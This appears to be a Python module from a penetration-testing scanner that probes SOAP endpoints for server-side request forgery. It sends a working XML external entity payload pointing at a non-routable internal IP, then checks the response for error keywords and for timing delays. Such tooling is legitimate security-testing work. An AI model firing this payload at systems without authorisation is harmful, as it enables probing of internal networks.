"""
SOAP SSRF test

Tests for Server-Side Request Forgery via XML entity resolution.
Uses timing-based detection — if SSRF payload causes significantly
longer response time than normal request, server attempted connection.
"""
import time
from ptlibs.ptjsonlib import PtJsonLib
from ptlibs.http.http_client import HttpClient
from argparse import Namespace
from ptlibs.ptprinthelper import ptprint

__TESTLABEL__ = "SOAP SSRF test"


class SSRFTest:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.http_client = http_client
        self.common_tests = common_tests
        self.helpers.print_header(__TESTLABEL__)

    def run(self):
        # Measure normal response time
        normal_start = time.time()
        normal_r = self.helpers.send_soap_request(
            data='<?xml version="1.0"?><soapenv:Envelope '
                 'xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                 '<soapenv:Body><message>ssrf_baseline</message></soapenv:Body>'
                 '</soapenv:Envelope>')
        normal_elapsed = time.time() - normal_start

        if normal_r is None:
            ptprint("Server not responding. Skipping SSRF test.", "INFO",
                    not self.args.json, indent=4)
            return

        # SSRF payload — non-routable IP causes real timeout
        ssrf_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://10.255.255.1:80/test">]>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>&ssrf;</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

        ssrf_r = None
        ssrf_elapsed = 0
        try:
            ssrf_start = time.time()
            ssrf_r = self.http_client.send_request(
                url=self.helpers.endpoint_url, method="POST",
                data=ssrf_payload, headers={"Content-Type": "text/xml"},
                merge_headers=False, allow_redirects=True
            )
            ssrf_elapsed = time.time() - ssrf_start
        except Exception:
            ssrf_elapsed = time.time() - ssrf_start

        # Check response for SSRF indicators
        if ssrf_r is not None:
            body_lower = ssrf_r.text.lower()
            ssrf_indicators = [
                "ssh-", "openssh", "connection refused", "connection reset",
                "refused to connect", "errno", "could not connect",
                "urlopen error", "urlerror", "ioerror", "oserror",
            ]
            matched = [ind for ind in ssrf_indicators if ind in body_lower]
            if matched:
                ptprint("SSRF detected — server contacted internal resource!", "VULN",
                        not self.args.json, indent=4, colortext=True)
                self.ptjsonlib.add_vulnerability(
                    "PTV-SOAP-SSRF", node_key=self.helpers.node_key,
                    data={"evidence": f"Entity resolution to http://10.255.255.1:80 returned "
                                      f"connection indicators: {matched}."})
                return

        # Timing-based detection
        if ssrf_elapsed >= 4.0 and normal_elapsed < 3:
            ptprint("SSRF detected — timeout indicates server-side connection attempt!", "VULN",
                    not self.args.json, indent=4, colortext=True)
            self.ptjsonlib.add_vulnerability(
                "PTV-SOAP-SSRF", node_key=self.helpers.node_key,
                data={"evidence": f"Entity resolution to http://10.255.255.1:80 caused "
                                  f"response delay ({ssrf_elapsed:.1f}s) while normal requests "
                                  f"complete in {normal_elapsed:.1f}s."})
            return

        ptprint("No SSRF indicators detected.", "OK", not self.args.json, indent=4)


def run(args, ptjsonlib, helpers, http_client, common_tests):
    SSRFTest(args, ptjsonlib, helpers, http_client, common_tests).run()
